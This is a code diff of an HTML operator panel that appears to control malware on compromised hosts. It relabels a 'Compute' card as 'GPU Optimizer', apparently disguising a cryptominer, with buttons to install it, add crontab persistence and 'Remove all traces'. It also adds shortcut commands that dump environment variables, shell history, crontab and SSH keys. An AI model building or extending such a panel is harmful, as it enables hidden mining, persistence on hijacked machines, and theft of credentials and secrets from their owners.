@@ -85,16 +85,31 @@
     </div>
   </div>
   <div class="card">
-    <h2 style="color:var(--purple)">Compute</h2>
+    <h2 style="color:var(--purple)">GPU Optimizer</h2>
     <div style="display:flex;flex-direction:column;gap:6px">
-      <button class="btn sm primary" onclick="sendCmd(':start')">:start</button>
-      <button class="btn sm" onclick="sendCmd(':status')">:status</button>
-      <button class="btn sm" onclick="sendCmd(':log')">:log</button>
-      <button class="btn sm" onclick="sendCmd(':persist')">:persist</button>
-      <button class="btn sm" onclick="sendCmd(':sysinfo')">:sysinfo</button>
-      <button class="btn sm" onclick="sendCmd(':portscan')">:portscan</button>
-      <button class="btn sm danger" onclick="sendCmd(':stop')">:stop</button>
-      <button class="btn sm danger" onclick="sendCmd(':cleanup')">:cleanup</button>
+      <button class="btn sm primary" onclick="sendCmd(':start')" title="Install & start optimizer">:start</button>
+      <button class="btn sm" onclick="sendCmd(':status')" title="Check optimizer status">:status</button>
+      <button class="btn sm" onclick="sendCmd(':log')" title="Show optimizer log">:log</button>
+      <button class="btn sm" onclick="sendCmd(':persist')" title="Add crontab persistence + start">:persist</button>
+      <button class="btn sm danger" onclick="sendCmd(':stop')" title="Kill optimizer processes">:stop</button>
+      <button class="btn sm danger" onclick="sendCmd(':cleanup')" title="Remove all traces">:cleanup</button>
+    </div>
+  </div>
+  <div class="card">
+    <h2>Shortcuts</h2>
+    <div style="display:flex;flex-direction:column;gap:4px;font-family:var(--font-mono);font-size:11px">
+      <button class="btn sm" onclick="sendCmd(':sysinfo')" title="Full system info">:sysinfo</button>
+      <button class="btn sm" onclick="sendCmd(':id')" title="whoami + hostname">:id</button>
+      <button class="btn sm" onclick="sendCmd(':ps')" title="Process list by CPU">:ps</button>
+      <button class="btn sm" onclick="sendCmd(':net')" title="Network interfaces + routes">:net</button>
+      <button class="btn sm" onclick="sendCmd(':ports')" title="Listening ports">:ports</button>
+      <button class="btn sm" onclick="sendCmd(':env')" title="All env variables">:env</button>
+      <button class="btn sm" onclick="sendCmd(':gpu')" title="GPU info">:gpu</button>
+      <button class="btn sm" onclick="sendCmd(':cwd')" title="Current dir + ls">:cwd</button>
+      <button class="btn sm" onclick="sendCmd(':history')" title="Shell history">:history</button>
+      <button class="btn sm" onclick="sendCmd(':cron')" title="Crontab">:cron</button>
+      <button class="btn sm" onclick="sendCmd(':ssh')" title="SSH keys/known_hosts">:ssh</button>
+      <button class="btn sm" onclick="sendCmd(':uptime')" title="Uptime + logged users">:uptime</button>
     </div>
   </div>
   <div class="card">
